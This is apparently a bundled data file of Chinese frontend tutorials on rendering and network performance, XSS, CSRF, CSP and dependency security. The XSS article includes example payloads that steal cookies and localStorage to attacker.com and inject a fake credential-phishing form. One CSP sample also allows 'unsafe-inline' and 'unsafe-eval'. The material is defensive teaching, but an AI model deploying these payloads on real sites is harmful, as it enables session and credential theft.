      fragment.appendChild(item);
    }
    this.container.innerHTML = '';
    this.container.appendChild(fragment);
  }
}

// ✅ 推荐：使用Intersection Observer懒加载
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      entry.target.src = entry.target.dataset.src;
      observer.unobserve(entry.target);
    }
  });
});

document.querySelectorAll('img[data-src]').forEach(img => {
  observer.observe(img);
});
\`\`\`

### 工具与监控

**性能分析工具：**
- Chrome DevTools Performance 面板
- Lighthouse
- WebPageTest
- Chrome DevTools Rendering 面板

**监控指标：**
- 首次绘制 (FP)
- 首次内容绘制 (FCP)
- 最大内容绘制 (LCP)
- 累积布局偏移 (CLS)
- 首次输入延迟 (FID)

### 最佳实践

- 理解渲染流程
- 减少回流和重绘
- 利用合成层
- 优化 CSS 和 JavaScript
- 使用性能分析工具
- 监控关键指标
- 持续优化和测试
- 考虑不同设备和浏览器`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"network-optimization",title:"网络请求优化",category:"performance",difficulty:"medium",tags:["性能优化","网络请求","HTTP/2","缓存策略"],content:`## 网络请求优化

网络请求是前端性能的关键瓶颈，优化网络请求可以显著提升页面加载速度和用户体验。

### HTTP 协议优化

**HTTP/2：**
- 多路复用：一个连接处理多个请求：HTTP/2引入的多路复用特性允许在单个TCP连接上同时传输多个请求和响应数据，突破了HTTP/1.1的队头阻塞问题，在HTTP/1.1中浏览器通常只能并发6个请求，而HTTP/2可以在一个连接上并发传输任意数量的请求，大幅提高了页面资源的并行下载能力，是HTTP/2性能提升的核心特性
- 服务器推送：主动推送资源：HTTP/2的服务器推送允许服务器在客户端请求某个资源时，主动将相关资源推送到客户端缓存中，当浏览器需要这些资源时可以直接从缓存使用，无需等待请求，例如当浏览器请求HTML页面时，服务器可以主动推送相关的CSS、JavaScript和图片资源，减少后续请求的延迟，服务器推送可以显著减少首屏加载时间
- 头部压缩：减少头部大小：HTTP/2使用HPACK算法对请求和响应头部进行压缩，包括静态表（常见的头部字段）、动态表（当前连接中出现的头部字段）和哈夫曼编码，显著减少了头部传输的数据量，在HTTP/1.1中每个请求都需要携带完整的Cookie、User-Agent等头部，而HTTP/2只需要传输头部索引，大幅减少了网络传输开销
- 二进制分帧：更高效的数据传输：HTTP/2将数据分割成更小的帧进行传输，每个帧都有帧头标识其所属的流（请求/响应），相比HTTP/1.1的文本格式，二进制格式解析更高效，错误更少，二进制分帧是多路复用的基础，允许在单个连接上并发传输多个请求和响应，同时保持顺序正确，是HTTP/2高性能的重要基础

**HTTP/3：**
- 基于 QUIC 协议
- 更快的连接建立
- 更好的拥塞控制
- 更强的可靠性

**HTTPS：**
- 加密传输
- 提高安全性
- 搜索引擎排名优势
- 浏览器信任度高

### 缓存策略

**强缓存：**
- Cache-Control 响应头
- Expires 响应头
- 不需要向服务器发起请求
- 直接使用缓存资源

**协商缓存：**
- ETag 响应头
- Last-Modified 响应头
- 向服务器发起请求验证资源是否过期
- 未过期则使用缓存

**缓存策略选择：**
- 静态资源：长缓存时间：对于不经常变化的静态资源如JavaScript、CSS、图片、字体等，应该设置较长的缓存时间（如一年），通过Cache-Control: max-age=31536000响应头实现，这样浏览器在首次加载后会缓存这些资源，后续访问直接从缓存读取，显著减少加载时间，通常配合文件名哈希（content hashing）实现缓存更新，当文件内容变化时生成新的哈希值，文件名变化后浏览器会重新请求
- 动态资源：协商缓存：对于经常变化的动态资源如HTML页面、API数据等，应该使用协商缓存策略，通过ETag或Last-Modified响应头让浏览器在后续请求时验证资源是否更新，浏览器发送If-None-Match或If-Modified-Since请求头，服务器判断资源是否变化，未变化返回304状态码使用缓存，变化则返回新资源，协商缓存可以在保证内容新鲜度的同时减少数据传输
- 关键资源：预加载：对于首屏渲染必需的关键资源如关键CSS、关键JavaScript、首屏图片等，应该使用preload预加载，让浏览器提前开始下载，避免渲染阻塞，preload可以设置正确的资源优先级，确保关键资源优先下载，通常将首屏必需的CSS内联到HTML中，JavaScript使用defer或async加载，避免阻塞HTML解析
- 非关键资源：延迟加载：对于非首屏必需的资源如图片、JavaScript模块、组件等，应该使用懒加载策略延迟加载，图片使用loading="lazy"属性或Intersection Observer API实现懒加载，JavaScript使用动态import()语法进行代码分割和按需加载，延迟加载可以减少首屏加载时间，加快首次内容绘制，让用户更快看到页面内容

### 请求优化

**减少请求数量：**
- 资源合并：CSS/JS 合并
- 精灵图：合并小图标
- 内联关键 CSS
- 减少第三方脚本

**减少请求大小：**
- 压缩资源：gzip、brotli
- 最小化 CSS/JS/HTML
- 优化图片：WebP、压缩
- 移除不必要的代码

**请求优先级：**
- 预加载关键资源
- 延迟加载非关键资源
- 合理使用资源提示
- 优化请求顺序

### CDN 与边缘计算

**CDN：**
- 内容分发网络
- 就近访问资源
- 提高加载速度
- 减轻源服务器负担

**边缘计算：**
- 在边缘节点处理请求
- 减少延迟
- 提高响应速度
- 适合动态内容

### 连接优化

**DNS 优化：**
- DNS 预解析
- 减少 DNS 查询时间
- 使用可靠的 DNS 提供商
- 合理设置 DNS TTL

**TCP 优化：**
- 启用 TCP 快速打开
- 优化 TCP 窗口大小
- 减少 TCP 连接建立时间
- 使用 HTTP 持久连接

**TLS 优化：**
- 启用 TLS 会话复用
- 使用 TLS 1.3
- 减少 TLS 握手时间
- 优化证书链

### 监控与分析

**网络监控：**
- Chrome DevTools Network 面板
- WebPageTest
- Lighthouse
- New Relic

**关键指标：**
- DNS 解析时间
- TCP 连接时间
- TLS 握手时间
- 首字节时间 (TTFB)
- 内容传输时间
- 总加载时间

### 最佳实践

- 升级到 HTTP/2 或 HTTP/3
- 实现合理的缓存策略
- 减少请求数量和大小
- 使用 CDN 分发静态资源
- 优化 DNS 和 TCP 连接
- 监控网络性能
- 持续优化和测试
- 考虑不同网络环境`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"xss-prevention",title:"XSS 攻击与防护",category:"security",difficulty:"medium",tags:["前端安全","XSS","跨站脚本攻击","防护策略"],content:`## XSS 攻击与防护

XSS (Cross-Site Scripting) 是一种常见的前端安全漏洞，攻击者通过注入恶意脚本到网页中，当用户浏览该页面时，恶意脚本会在用户的浏览器中执行。

### 🛡️ XSS 攻击类型

**存储型 XSS：**
- **恶意脚本被存储在服务器数据库中**
- **当其他用户访问包含该脚本的页面时触发**
- **常见于论坛、评论系统、社交网络**
- **危害较大，影响范围广**

**反射型 XSS：**
- **恶意脚本通过 URL 参数传递**
- **服务器将参数反射回浏览器执行**
- **常见于搜索、错误页面**
- **通常需要用户点击恶意链接**

**DOM 型 XSS：**
- **恶意脚本在客户端执行**
- **不经过服务器**
- **利用 DOM 操作漏洞**
- **直接在浏览器中执行**

### 💻 代码示例：XSS 攻击演示

\`\`\`javascript
// 存储型 XSS
// 恶意评论
const maliciousComment = '<script>alert("XSS")</script>';
// 存储到数据库
saveComment(maliciousComment);

// 其他用户访问时
function displayComments() {
  comments.forEach(comment => {
    // 不安全的渲染
    document.getElementById('comments').innerHTML = comment;
  });
}

// 反射型 XSS
// 恶意 URL
const maliciousURL = 'https://example.com/search?q=<script>alert("XSS")</script>';
// 服务器反射
function search(q) {
  return \`Search results for: \${q}\`;
}

// DOM 型 XSS
// 不安全的 DOM 操作
function updateContent() {
  const userInput = getUserInput();
  document.getElementById('content').innerHTML = userInput;
}

// 恶意输入
const maliciousInput = '<img src=x onerror="alert('XSS')">';
updateContent(maliciousInput);
\`\`\`

### XSS 攻击危害

**数据窃取：**
- 窃取用户 cookie
- 窃取会话令牌
- 窃取用户敏感信息
- 钓鱼攻击

**会话劫持：**
- 冒充用户身份
- 执行未授权操作
- 访问用户账户
- 修改用户数据

**网站破坏：**
- 篡改网页内容
- 重定向到恶意网站
- 植入恶意广告
- 影响网站声誉

**拒绝服务：**
- 消耗浏览器资源
- 导致页面崩溃
- 影响用户体验
- 可能影响服务器

### 代码示例

#### 数据窃取示例

\`\`\`javascript
// 窃取 Cookie
const maliciousScript = \`
  <script>
    // 窃取所有 cookie
    const cookies = document.cookie;
    
    // 发送到攻击者服务器
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({ cookies }),
      headers: { 'Content-Type': 'application/json' }
    });
  </script>
\`;

// 窃取本地存储
const stealLocalStorage = \`
  <script>
    const localStorageData = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      localStorageData[key] = localStorage.getItem(key);
    }
    
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({ localStorageData }),
      headers: { 'Content-Type': 'application/json' }
    });
  </script>
\`;

// 钓鱼攻击
const phishingScript = \`
  <script>
    // 创建虚假登录表单
    const fakeForm = document.createElement('form');
    fakeForm.method = 'POST';
    fakeForm.action = 'https://attacker.com/steal-credentials';
    
    const usernameInput = document.createElement('input');
    usernameInput.name = 'username';
    usernameInput.placeholder = 'Username';
    
    const passwordInput = document.createElement('input');
    passwordInput.name = 'password';
    passwordInput.type = 'password';
    passwordInput.placeholder = 'Password';
    
    const submitButton = document.createElement('button');
    submitButton.type = 'submit';
    submitButton.textContent = 'Login';
    
    fakeForm.appendChild(usernameInput);
    fakeForm.appendChild(passwordInput);
    fakeForm.appendChild(submitButton);
    
    document.body.appendChild(fakeForm);
  </script>
\`;
\`\`\`

### XSS 防护策略

**输入验证：**
- 对用户输入进行过滤
- 限制输入长度
- 验证输入格式
- 转义特殊字符

**输出编码：**
- HTML 实体编码：HTML实体编码是将特殊字符转换为HTML实体表示的方法，如小于号<转换为&lt;、大于号>转换为&gt;、引号"转换为&quot;等，可以防止用户输入被解析为HTML代码，是防御XSS攻击的最基本方法，在将用户输入插入到HTML页面中时必须进行HTML实体编码，大多数现代前端框架默认会自动进行HTML编码
- JavaScript 编码：当用户输入需要插入到JavaScript代码中时，需要进行JavaScript编码，将特殊字符转换为Unicode转义序列，如单引号'转换为\\u0027、双引号"转换为\\u0022等，JavaScript编码可以防止用户输入突破字符串边界被执行，是防止XSS攻击的重要组成部分，在动态生成JavaScript代码时必须使用
- CSS 编码：当用户输入需要插入到CSS属性值中时，需要进行CSS编码，将特殊字符转换为CSS转义序列，如反斜杠\\转换为\\\\、换行转换为\\A等，CSS编码可以防止用户输入突破CSS属性值边界注入新的CSS规则或JavaScript，是防止XSS和CSS注入攻击的重要手段
- URL 编码：URL编码（Percent-encoding）是将特殊字符转换为URL安全格式的方法，将字符转换为%XX格式的十六进制表示，如空格转换为%20、中文转换为UTF-8编码的%XX格式等，URL编码用于将用户输入安全地插入到URL的查询参数或路径中，防止URL注入和参数污染攻击

**内容安全策略 (CSP)：**
- 限制脚本执行来源
- 禁止内联脚本
- 禁止 eval() 等危险函数
- 配置 report-uri 监控攻击

**HTTP Only Cookie：**
- 防止 JavaScript 访问 cookie
- 减少 cookie 被窃取的风险
- 提高会话安全性

**现代框架防护：**
- React：自动转义内容：React框架默认会对JSX中的内容进行HTML转义，防止XSS攻击，当使用{userInput}插入用户输入时，React会自动将特殊字符转换为HTML实体，只有使用dangerouslySetInnerHTML时需要手动处理转义，这是React的安全特性之一，但开发者仍需注意不要使用用户输入来构建动态组件名或属性名
- Vue：v-html 指令的安全使用：Vue的v-html指令用于渲染HTML内容，但存在XSS风险，因为v-html不会对HTML内容进行转义，如果HTML内容包含恶意脚本，可能会被执行，使用v-html时应该确保内容来源可信，或者使用DOMPurify等库对HTML进行净化，避免直接渲染用户输入的HTML内容
- Angular：内置 XSS 防护：Angular框架内置了强大的XSS防护机制，默认对所有数据绑定进行转义处理，Angular的编译器会对模板进行严格的安全检查，阻止危险的绑定方式，Angular还提供了DomSanitizer服务用于安全地处理需要插入原始HTML的场景，使用bypassSecurityTrustHtml等方法时必须确保内容已经过适当清理
- 使用框架提供的安全 API

### 代码示例

#### 输入验证示例

\`\`\`javascript
// 使用 DOMPurify 清理 HTML
import DOMPurify from 'dompurify';

function sanitizeHTML(html) {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
    ALLOWED_ATTR: []
  });
}

// 使用示例
const userInput = '<script>alert("XSS")</script><p>Hello</p>';
const cleanHTML = sanitizeHTML(userInput);
console.log(cleanHTML); // '<p>Hello</p>'

// 验证输入格式
function validateInput(input, type) {
  const patterns = {
    email: /^[^s@]+@[^s@]+.[^s@]+$/,
    url: /^https?://.+/,
    username: /^[a-zA-Z0-9_]{3,20}$/
  };
  
  return patterns[type].test(input);
}

// 限制输入长度
function truncateInput(input, maxLength) {
  return input.length > maxLength ? input.substring(0, maxLength) : input;
}

// 使用示例
const email = 'user@example.com';
if (validateInput(email, 'email')) {
  console.log('Valid email');
} else {
  console.log('Invalid email');
}
\`\`\`

#### 输出编码示例

\`\`\`javascript
// HTML 实体编码
function encodeHTML(str) {
  return str.replace(/[&<>"']/g, function(m) {
    return {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    }[m];
  });
}

// JavaScript 编码
function encodeJS(str) {
  return str.replace(/[\\u0000-\\uFFFF]/g, function(m) {
    return '\\\\u' + ('0000' + m.charCodeAt(0).toString(16)).slice(-4);
  });
}

// URL 编码
function encodeURL(str) {
  return encodeURIComponent(str);
}

// 使用示例
const userInput = '<script>alert("XSS")</script>';
const safeHTML = encodeHTML(userInput);
console.log(safeHTML); // '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'

// React 自动转义
function ReactComponent({ content }) {
  // React 自动转义 content
  return <div>{content}</div>;
}

// 使用 dangerouslySetInnerHTML（不推荐）
function UnsafeComponent({ content }) {
  // 不安全，需要手动转义
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
}

// 安全使用 dangerouslySetInnerHTML
function SafeComponent({ content }) {
  const cleanHTML = DOMPurify.sanitize(content);
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}
\`\`\`

#### CSP 配置示例

\`\`\`html
<!-- HTTP 头配置 -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://trusted.cdn.com;
  style-src 'self' 'unsafe-inline' https://trusted.cdn.com;
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://trusted.cdn.com;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  report-uri /csp-report
">

<!-- 服务器配置示例 -->
<!-- Nginx -->
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' https://trusted.cdn.com;
  style-src 'self' https://trusted.cdn.com;
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://trusted.cdn.com;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  report-uri /csp-report
";

<!-- Express.js -->
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "https://trusted.cdn.com"],
    styleSrc: ["'self'", "https://trusted.cdn.com"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.example.com"],
    fontSrc: ["'self'", "https://trusted.cdn.com"],
    objectSrc: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"],
    frameAncestors: ["'none'"],
    reportUri: "/csp-report"
  }
}));
\`\`\`

#### HTTP Only Cookie 示例

\`\`\`javascript
// 设置 HTTP Only Cookie
res.cookie('sessionId', sessionId, {
  httpOnly: true,  // 防止 JavaScript 访问
  secure: true,    // 只通过 HTTPS 传输
  sameSite: 'strict',  // 防止 CSRF 攻击
  maxAge: 3600000,  // 1 小时过期
  path: '/'
});

// Express.js 示例
app.use(session({
  secret: 'your-secret-key',
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 3600000
  }
}));

// Next.js 示例
export async function setSessionCookie(res, sessionId) {
  res.setHeader('Set-Cookie', [
    \`sessionId=\${sessionId}; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600\`
  ]);
}
\`\`\`

### 防护最佳实践

- 始终对用户输入进行验证和清理
- 使用框架提供的安全 API，避免手动拼接 HTML
- 配置严格的 CSP 策略
- 使用 HTTP Only 和 Secure Cookie
- 定期进行安全审计和渗透测试
- 保持依赖库的更新
- 使用安全的第三方库
- 实施内容安全策略监控
- 教育开发团队安全意识

`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"csrf-prevention",title:"CSRF 攻击与防护",category:"security",difficulty:"medium",tags:["前端安全","CSRF","跨站请求伪造","防护策略"],content:`## CSRF 攻击与防护

CSRF (Cross-Site Request Forgery) 是一种常见的网络攻击，攻击者诱导用户在已登录的 web 应用上执行非预期的操作。

### CSRF 攻击原理

**攻击流程：**
- 用户登录目标网站 A，获取会话 cookie
- 攻击者诱导用户访问恶意网站 B
- 恶意网站 B 向网站 A 发送请求
- 浏览器自动携带用户的 cookie
- 网站 A 误认为是用户的合法操作
- 执行攻击者指定的操作

**攻击条件：**
- 用户已登录目标网站
- 目标网站存在 CSRF 漏洞
- 用户被诱导访问恶意网站
- 请求不需要额外的验证

### CSRF 攻击危害

**未授权操作：**
- 修改用户密码
- 转账操作
- 发表恶意内容
- 更改用户设置

**数据泄露：**
- 窃取用户信息
- 访问敏感数据
- 破坏数据完整性
- 影响系统安全

**账户接管：**
- 完全控制用户账户
- 执行任意操作
- 长期访问权限
- 难以检测

**业务影响：**
- 声誉损失
- 用户信任下降
- 法律责任
- 经济损失

### CSRF 防护策略

**CSRF Token：**
- 生成随机 token
- 存储在 session 中
- 在表单中包含 token
- 验证请求中的 token

**SameSite Cookie：**
- 设置 SameSite 属性
- 限制 cookie 跨站发送
- 可选值：Strict、Lax、None
- 现代浏览器支持

**Referer 验证：**
- 检查 HTTP Referer 头
- 验证请求来源
- 防止跨站请求
- 作为辅助防护

**Origin 验证：**
- 检查 HTTP Origin 头
- 更可靠的来源验证
- 不受 Referer 限制
- 现代浏览器支持

**双重提交 Cookie：**
- 将 token 存储在 cookie 中
- 在请求中包含 token
- 验证两者是否匹配
- 适合单页应用

### 防护最佳实践

**前端防护：**
- 包含 CSRF token 在请求中
- 使用框架提供的 CSRF 防护
- 避免使用 GET 请求修改数据
- 验证请求来源

**后端防护：**
- 实现 CSRF token 验证
- 设置 SameSite cookie
- 验证 Referer/Origin 头
- 对敏感操作额外验证

**安全设计：**
- 使用 POST/PUT/DELETE 而非 GET
- 实现请求限速
- 敏感操作二次验证
- 定期安全审计

**监控与响应：**
- 监控异常请求模式
- 及时响应安全事件
- 修复漏洞
- 通知用户

### 工具与资源

**安全扫描工具：**
- OWASP ZAP：OWASP ZAP（Zed Attack Proxy）是OWASP组织开发的开源Web应用安全扫描工具，提供自动扫描器和手动测试功能，可以检测SQL注入、XSS、CSRF等常见Web安全漏洞，支持代理模式、主动扫描、被动扫描等多种测试方式，是Web安全测试的入门首选工具，完全免费且开源
- Burp Suite：Burp Suite是专业的Web安全测试工具，提供代理服务器、漏洞扫描器、 intruder（暴力破解工具）、Repeater（请求重放工具）等功能，是安全工程师的标准工具，分为免费版和专业版，专业版提供更强大的扫描能力和自动化功能，可以检测复杂的安全漏洞，是Web渗透测试的行业标准工具
- CSRF Tester：CSRF Tester是OWASP开发的CSRF漏洞检测工具，通过代理模式拦截用户请求，自动生成CSRF攻击测试用例，帮助测试人员发现Web应用中的CSRF漏洞，该工具可以自动分析表单并生成包含CSRF令牌的测试请求，帮助开发者验证CSRF防护措施的有效性
- Acunetix：Acunetix是一款商业Web应用漏洞扫描器，提供自动化的安全扫描服务，支持检测SQL注入、XSS、CSRF、文件包含、命令注入等数千种安全漏洞，提供详细的漏洞报告和修复建议，集成CI/CD流水线功能，适合企业级Web安全测试，支持自动化定期扫描和实时监控

**学习资源：**
- OWASP CSRF 防护 cheat sheet：OWASP发布的CSRF防护最佳实践指南，详细介绍了CSRF攻击的原理、预防方法、检测技术等，包括使用CSRF Token、同源检测、SameSite Cookie等防护措施，是学习CSRF防护的重要参考资料，提供了多种编程语言的实现示例
- MDN 安全文档：Mozilla Developer Network（MDN）提供的Web安全文档，是学习Web安全的权威参考，涵盖XSS、CSRF、CSP、HTTPS等所有Web安全主题，提供了详细的解释、代码示例和最佳实践，是前端开发者学习安全知识的首选资源
- 框架 CSRF 防护指南
- 安全社区论坛

### 案例分析

**知名 CSRF 攻击事件：**
- GitHub CSRF 漏洞：GitHub曾被发现存在CSRF漏洞，攻击者可以利用该漏洞修改用户的仓库设置、创建删除文件等，这个漏洞的发现推动了业界对CSRF防护的重视，学习这些历史漏洞案例有助于理解CSRF攻击的危害和防护的重要性
- Facebook CSRF 漏洞：Facebook曾被发现存在CSRF漏洞，攻击者可以通过诱导用户点击恶意链接来执行未授权操作，如点赞、关注、发布内容等，这个漏洞影响范围广泛，暴露了社交网络平台在CSRF防护方面的不足，学习此类案例有助于理解CSRF攻击的实际危害
- 银行网站 CSRF 漏洞
- 大型网站的安全事件

**防护措施效果：**
- CSRF token 的有效性
- SameSite cookie 的作用
- 多重防护的重要性
- 安全意识的作用`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"csp-implementation",title:"内容安全策略 (CSP) 实施",category:"security",difficulty:"medium",tags:["前端安全","CSP","内容安全策略","安全配置"],content:`## 内容安全策略 (CSP) 实施

内容安全策略 (Content Security Policy, CSP) 是一种安全机制，通过指定哪些资源可以被加载和执行，从而减少 XSS 等攻击的风险。

### CSP 基本概念

**定义：**
- 浏览器安全机制
- 通过 HTTP 头部或 meta 标签指定
- 限制资源加载来源
- 防止恶意脚本执行

**目标：**
- 减少 XSS 攻击风险
- 防止数据窃取
- 提高网站安全性
- 提供安全监控

**工作原理：**
- 浏览器解析 CSP 指令
- 验证资源加载请求
- 阻止不符合策略的资源
- 报告违规行为

### CSP 指令

**资源来源指令：**
- default-src：默认资源来源
- script-src：脚本来源
- style-src：样式来源
- img-src：图片来源
- font-src：字体来源
- media-src：媒体来源
- connect-src：网络请求来源
- frame-src：框架来源

**行为限制指令：**
- script-src-elem：脚本元素来源
- script-src-attr：脚本属性来源
- style-src-elem：样式元素来源
- style-src-attr：样式属性来源
- base-uri：base 标签来源
- form-action：表单提交目标
- frame-ancestors：允许嵌入当前页面的来源

**报告指令：**
- report-uri：违规报告地址
- report-to：违规报告组
- report-sample：包含违规代码样本

### CSP 实施策略

**严格策略：**
- 仅允许受信任的来源
- 禁止内联脚本
- 禁止 eval() 等危险函数
- 适合安全性要求高的网站

**宽松策略：**
- 允许更多的来源
- 可能允许内联脚本
- 适合迁移阶段
- 逐步收紧策略

**迁移策略：**
- 首先使用 report-only 模式
- 分析违规报告
- 逐步调整策略
- 最终启用强制模式

### CSP 实施方法

**HTTP 头部：**
- Content-Security-Policy: 指令：Content-Security-Policy响应头是CSP的核心，用于指定允许加载资源的来源，主要指令包括default-src（默认来源）、script-src（脚本来源）、style-src（样式来源）、img-src（图片来源）、connect-src（连接来源）、font-src（字体来源）等，每个指令可以指定多个来源如'self'、'none'、'unsafe-inline'、https:等，合理配置CSP可以有效防御XSS和数据注入攻击
- Content-Security-Policy-Report-Only: 指令：Content-Security-Policy-Report-Only响应头用于测试CSP策略而不强制执行，当策略违规时会发送报告但不会阻止资源加载，非常适合在正式部署前测试CSP配置，通过report-uri或report-to指令指定报告接收地址，开发者可以查看哪些资源会被拦截据以调整策略
- 服务器配置
- 更灵活的控制

**Meta 标签：**
- <meta http-equiv="Content-Security-Policy" content="指令">
- 客户端配置
- 不支持 report-uri
- 适合静态网站

**配置示例：**

Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'; img-src 'self' data:; report-uri /csp-report

### CSP 最佳实践

**资源管理：**
- 使用 CDN 时指定完整 URL
- 避免使用 'unsafe-inline'
- 避免使用 'unsafe-eval'
- 使用 nonce 或 hash 允许特定内联脚本

**报告机制：**
- 实施报告机制
- 分析违规报告
- 及时调整策略
- 监控安全事件

**框架集成：**
- React：使用 dangerouslySetInnerHTML 时注意：React的dangerouslySetInnerHTML属性允许插入原始HTML内容，绕过React的自动转义机制，使用时必须先对内容进行严格的清理，可以使用DOMPurify等HTML清理库过滤恶意脚本，建议先评估是否真的需要使用dangerouslySetInnerHTML，尽量使用React组件化方式渲染内容
- Vue：v-html 指令的安全使用
- Angular：内置 CSP 支持：Angular框架内置了对内容安全策略的原生支持，可以通过Angular的Meta服务动态管理CSP策略，Angular的DomSanitizer提供了bypassSecurityTrustHtml、bypassSecurityTrustScript等方法用于安全地处理可信内容，使用这些方法时需要确保内容来源可靠，Angular还自动处理了大多数常见的XSS场景
- 检查框架文档

**测试与验证：**
- 使用 CSP 生成器
- 测试不同浏览器兼容性
- 验证策略效果
- 监控用户体验

### CSP 兼容性

**浏览器支持：**
- 现代浏览器支持良好
- IE 11 部分支持
- 移动浏览器支持
- 检查 Can I Use

**降级策略：**
- 不支持 CSP 的浏览器
- 备用安全措施
- 渐进增强
- 安全优先

### 工具与资源

**CSP 生成器：**
- CSP Generator：CSP Generator是在线CSP策略生成工具，帮助开发者创建适合自己网站的CSP配置，通过图形界面选择需要允许的脚本、样式、图片等来源，自动生成CSP策略代码，支持导出为HTTP头或meta标签格式，适合不了解CSP语法的开发者快速入门
- CSP Evaluator：CSP Evaluator是Google提供的在线CSP分析工具，可以评估网站CSP策略的安全性，检查是否存在潜在的配置问题，提供改进建议，支持输入CSP策略字符串或URL进行评估，是检测CSP配置错误的利器，帮助开发者发现可能被绕过的配置
- Google CSP Tool：Google提供的CSP配置工具和文档资源，帮助网站配置和验证内容安全策略，Google的CSPEvaluator是其中最常用的工具，Google还提供了详细的CSP部署指南和最佳实践，是学习CSP配置的重要资源
- Mozilla Observatory：Mozilla Observatory是Mozilla提供的网站安全分析工具，可以评估网站的CSP、HSTS、Cookie安全等多项安全配置，给出安全评分和改进建议，支持一键扫描和详细的配置检查，是评估网站整体安全状况的实用工具

**学习资源：**
- MDN CSP 文档：Mozilla Developer Network提供的CSP完整文档，详细介绍了CSP的所有指令、语法、使用方法，提供了代码示例和最佳实践，是学习CSP的权威参考文档，适合开发者深入了解CSP的各个方面
- OWASP CSP 指南：OWASP组织发布的CSP配置最佳实践指南，详细介绍了如何正确配置CSP来防御各种Web攻击，提供了常见场景的配置示例和注意事项，是企业级应用配置CSP的重要参考
- Google Web Fundamentals
- 安全社区论坛

### 案例分析

**成功实施 CSP 的网站：**
- Google
- Facebook
- Twitter
- 大型金融网站

**实施效果：**
- XSS 攻击减少
- 安全事件减少
- 开发规范改善
- 用户信任提升`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"dependency-security",title:"依赖包安全管理",category:"security",difficulty:"medium",tags:["前端安全","依赖包","安全审计","漏洞管理"],content:`## 依赖包安全管理

前端项目依赖众多第三方包，这些包可能存在安全漏洞，需要进行有效的安全管理。

### 依赖包安全风险

**漏洞类型：**
- 代码注入
- XSS 漏洞
- CSRF 漏洞
- 权限提升
- 信息泄露
- 拒绝服务

**风险来源：**
- 直接依赖的漏洞
- 间接依赖的漏洞
- 过时的依赖版本
- 恶意依赖包
- 供应链攻击

**影响范围：**
- 项目安全
- 用户数据安全
- 网站可用性
- 业务声誉

### 依赖包安全工具

**安全扫描工具：**
- npm audit：npm 内置工具
- yarn audit：Yarn 内置工具
- snyk：专业安全扫描
- dependabot：自动依赖更新
- OWASP Dependency-Check：OWASP Dependency-Check是开源的依赖漏洞扫描工具，可以分析项目依赖项并识别已知的安全漏洞，支持多种语言和构建工具，生成详细的漏洞报告，帮助开发者及时发现和修复依赖中的安全问题，是CI/CD流水线中常用的安全检查工具

**静态分析工具：**
- ESLint 安全插件
- SonarQube
- CodeQL：CodeQL是GitHub开发的代码分析引擎，支持多种编程语言，可以查询代码库中的安全漏洞，类似于SQL的查询语言让安全分析变得可编写和可复用，CodeQL是GitHub高级安全功能的核心组件，可以自动识别代码中的安全问题和代码异味
- Checkmarx

**监控工具：**
- GitHub Security Alerts：GitHub Security Alerts是GitHub提供的依赖安全告警功能，当项目的依赖项存在已知漏洞时会自动发送告警，可以在仓库的Security标签页查看漏洞详情，支持一键修复或手动更新依赖，建议启用此功能以确保依赖安全
- npm Security Advisories
- Snyk Monitor：Snyk Monitor是Snyk平台的依赖监控服务，持续跟踪项目依赖的安全状况，发现新漏洞时及时通知，可以与GitHub、GitLab等平台集成，提供自动化的漏洞检测和修复建议，支持开源项目和商业项目
- WhiteSource

### 依赖管理最佳实践

**依赖选择：**
- 选择活跃维护的包
- 查看 GitHub stars 和 issues
- 检查包的安全历史
- 优先选择官方或知名包

**版本管理：**
- 使用精确版本
- 避免使用 * 或 ^ 范围
- 定期更新依赖
- 测试更新后的兼容性

**依赖锁定：**
- 使用 package-lock.json 或 yarn.lock
- 确保一致的依赖版本
- 防止意外的依赖变更
- 便于审计和回滚

**安全审计：**
- 定期运行安全扫描
- 分析扫描结果
- 修复高风险漏洞
- 记录审计过程

### 漏洞修复策略

**紧急漏洞：**
- 立即更新或替换依赖
- 临时解决方案
- 部署修复
- 通知相关方

**高风险漏洞：**
- 制定修复计划
- 测试修复方案
- 安排部署
- 验证修复效果

**中低风险漏洞：**
- 纳入常规更新计划
- 监控漏洞状态
- 评估实际风险
- 适时修复

### 供应链安全

**依赖来源验证：**
- 使用官方 npm registry
- 配置 npm 镜像源
- 验证包的完整性
- 检查包的签名

**构建环境安全：**
- 隔离构建环境
- 使用固定版本的依赖
- 扫描构建产物
- 实施 CI/CD 安全检查

**依赖包审查：**
- 审查新引入的依赖
- 检查依赖的许可
- 评估依赖的安全性
- 建立依赖审批流程

### 工具集成

**CI/CD 集成：**
- 在构建过程中运行安全扫描
- 配置安全门禁
- 自动生成安全报告
- 集成依赖更新工具

**开发工具集成：**
- IDE 安全插件
